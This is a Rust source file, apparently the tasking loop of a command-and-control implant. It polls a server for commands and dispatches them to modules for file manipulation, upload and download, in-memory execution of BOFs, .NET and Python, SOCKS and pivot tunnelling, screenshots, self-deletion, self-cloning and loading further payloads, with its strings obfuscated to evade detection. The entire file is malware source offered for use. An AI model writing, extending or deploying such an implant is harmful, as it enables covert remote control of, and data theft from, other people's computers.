use obfstr::obfstr;
use crate::transport;
use crate::features::exit;
use crate::features::pong;
use crate::features::filesystem;
use crate::features::upload;
use crate::features::download;
use crate::features::psw;
use crate::features::socks;
use crate::features::executeBOF;
use crate::features::executeDOT;
use crate::features::executePY;
use crate::features::list_processes;
use crate::features::pivot;
use crate::features::screenshot;
use crate::features::selfdelete;
use crate::features::selfclone;
use crate::features::loadLoader;

pub fn getTasking() -> Result<(), Box<dyn std::error::Error>> {
    let checkin_data = serde_json::json!({
        obfstr!("action"): obfstr!("get_tasking"),
        obfstr!("tasking_size"): 10
    });
    let json_str = serde_json::to_string(&checkin_data)?;
    let json = transport::send_request_with_response(&json_str)?;

    let tasks = json.get(obfstr!("tasks")).ok_or("No tasks field")?;
    for task in tasks.as_array().ok_or("Tasks not array")? {
        if let Some(cmd) = task.get("command").and_then(|v| v.as_str()) {
            crate::helpers::churn(cmd);
        }
        if let Err(e) = handleTask(task) {
            if let Some(task_id) = task.get("id").and_then(|v| v.as_str()) {
                let err_resp = serde_json::json!({
                    obfstr!("action"): obfstr!("post_response"),
                    obfstr!("responses"): [{obfstr!("task_id"): task_id, obfstr!("user_output"): format!("Error: {}", e), "status": "error", obfstr!("completed"): true}]
                }).to_string();
                let _ = transport::send_request(&err_resp);
            }
        }
    }
    if let Some(socks) = json.get("socks") {
        for sock in socks.as_array().ok_or("Socks not array")? {
            let _ = socks::handle_socks(sock);
        }
    }
    Ok(())
}

pub fn handleTask(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    let command = task.get("command").unwrap().as_str().unwrap();
    let id = task.get("id").unwrap().as_str().unwrap();

    if command == obfstr!("ping") { pong::pong(task)?; return Ok(()); }
    if command == obfstr!("exit") { exit::exit(task)?; return Ok(()); }
    if command == obfstr!("ls") || command == obfstr!("rm") || command == obfstr!("mkdir")
        || command == obfstr!("mv") || command == obfstr!("cp") || command == obfstr!("touch")
        || command == obfstr!("pwd") { filesystem::handle_fs_command(task)?; return Ok(()); }
    if command == obfstr!("upload") { upload::upload(task)?; return Ok(()); }
    if command == obfstr!("download") { download::download(task)?; return Ok(()); }
    if command == obfstr!("psw") { psw::handle_ps_command(task)?; return Ok(()); }
    if command == obfstr!("executeBOF") { executeBOF::executeBOF(task)?; return Ok(()); }
    if command == obfstr!("executeDOT") { executeDOT::executeDOT(task)?; return Ok(()); }
    if command == obfstr!("executePY") { executePY::executePY(task)?; return Ok(()); }
    if command == obfstr!("ps") { list_processes::list_processes(task)?; return Ok(()); }
    if command == obfstr!("start_pivot") { pivot::startPivotListener(task)?; return Ok(()); }
    if command == obfstr!("stop_pivot") { pivot::stopPivotListener(task)?; return Ok(()); }
    if command == obfstr!("list_pivot") { pivot::listPivotListeners(task)?; return Ok(()); }
    if command == obfstr!("screenshot") { screenshot::screenshot(task)?; return Ok(()); }
    if command == obfstr!("selfdelete") { selfdelete::selfdelete(task)?; return Ok(()); }
    if command == obfstr!("selfclone") { selfclone::selfclone(task)?; return Ok(()); }
    if command == obfstr!("loadLoader") { loadLoader::loadLoader(task)?; return Ok(()); }

    let response = serde_json::json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [{
            obfstr!("task_id"): id,
            obfstr!("completed"): true,
            "status": "success",
        }]
    });

    let json_str = serde_json::to_string(&response)?;
    transport::send_request(&json_str)?;
    Ok(())
}
